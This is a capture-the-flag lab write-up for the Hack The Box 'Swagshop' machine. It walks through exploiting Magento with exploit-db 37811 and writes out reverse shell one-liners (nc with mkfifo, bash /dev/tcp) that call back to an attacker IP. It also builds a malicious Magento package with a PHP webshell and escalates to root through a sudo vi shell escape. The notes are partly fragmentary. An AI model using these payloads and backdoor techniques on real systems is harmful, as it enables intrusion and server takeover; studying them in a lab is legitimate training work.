Swagshop HTB, IP 10.10.10.140

#Initial Enumeration

1. nmap -sC -sV 10.10.10.140


2. Dirbuster/ Gobuster
  gobuster dir -u 10.10.10.140 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 20 -s 200 -x php,txt,pl,sh,asp,aspx,html,json,py,cfm,rb,cgi -r -k



-----------------------------------------------------------------------------------------------------------------------------------------------
#Port Enumeration
Enumerating port 80 & 443

Magento Version

Google
2014 Magento Demo Store exploit



10.10.10.14/index.php


At this moment, we have an admin user. In order to access the web server's files we need a shell. We would try to see if we can upload a file or send a reverse shell as an email. Additioanally, we would search for possible exploits and here it is
https://www.exploit-db.com/exploits/37811

Modifications:


username and password forme:forme
install date /app/etc/local.xml FOUND!


uncomment this line and sent to Burp Suite





Warning at the URL's parameters. Here we had 7d=7days but intercepting the request with burp suite we found out that there are more parameters to choose. So, changing 7d to 2d, the script worked.





We have an RCE since we can execute a command like whoami so we would try to get a shell.

1. python 37811.py http://10.10.10.140/index.php/admin "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/csh -i | nc 10.10.14.15 8888 >/tmp/f"


2.python 37811.py http://10.10.10.140/index.php/admin "bash -c 'bash -i >& /dev/tcp/10.10.14.15/8888 0>&1'"


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
kali# python magento_rce.py 'http://10.10.10.140/index.php/admin' "uname -a"
Linux swagshop 4.4.0-146-generic #172-Ubuntu SMP Wed Apr 3 09:00:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


RCE #2 - Magento Package
When the box was released, there was a second way to get RCE via uploading a Magento package. It seems this method has been patched in the current instance of the box, as /download is not longer there. 

From GitHub
This GitHub has a template for a malicious Magento package. I’ll download lavalamp_magento_bd.tgz, and upload it via http://10.10.10.140/downloader/:


Now I can use the webshell it installs:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@kali# curl -d 'c=id' http://10.10.10.140/index.php/lavalamp/index
uid=33(www-data) gid=33(www-data) groups=33(www-data)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

From Scratch
This post gives a good walkthrough for creating a malicious Magento package. I’ll create two files in the following structure:


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@kali# tree .
.
├── errors
│   └── cmd.php
└── package.xml

1 directory, 2 files
cmd.php:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<?php system($_REQUEST['cmd']); ?>
package.xml:
<?xml version="1.0"?>
<package>
<name>backdoor</name>
<version>1.3.3.7</version>
<stability>devel</stability>
<licence>backdoor</licence>
<channel>community</channel>
<extends/>
<summary>Backdoor for magento</summary>
<description>Backdoor for magento</description>
<notes>backdoor</notes>
<authors>
    <author>
        <name>jvoisin</name>
        <user>jvoisin</user>
        <email>julien.voisin@dustri.org</email>
    </author>
</authors>
<date>2015-08-17</date>
<time>13:47:49</time>
<contents>
    <target name="mage">
        <dir>
            <dir name="errors">
                <file name="cmd.php" hash="c214a2fb80bab315fc328a5eff2892b5"/>
            </dir>
        </dir>
    </target>
</contents>
<compatible/>
<dependencies>
    <required>
        <php>
            <min>5.2.0</min>
            <max>6.0.0</max>
        </php>
    </required>
</dependencies>
</package>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



It is important that the hash is created correctly for the php file as follows:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@kali# md5sum errors/cmd.php 
c214a2fb80bab315fc328a5eff2892b5  errors/cmd.php
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Now I’ll use tar to package it up:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

root@kali# tar -czvf package.tgz errors/ package.xml 
errors/
errors/cmd.php
package.xml
root@kali# ls
errors  package.tgz  package.xml
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


And upload the tgz file, and I have RCE through a webshell:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@kali# curl http://10.10.10.140/errors/cmd.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Link:https://0xdf.gitlab.io/2019/09/28/htb-swagshop.html

------------------------------------------------------------------------------------------------------------------------------------------------------------------
#Privilege Escalation
sudo -l


1. sudo vi /var/www/html/NonExistingFile -c ':!/bin/sh'


2. I’ll open a non-existing file with 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
www-data@swagshop:/home/haris$ sudo /usr/bin/vi /var/www/html/NonExistingFile.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

GTFOBins’ vi page tells me how to get a shell from here:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
:set shell=/bin/sh
:shell
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


root flag
c2b087d66e14a652a3b86a130ac56721

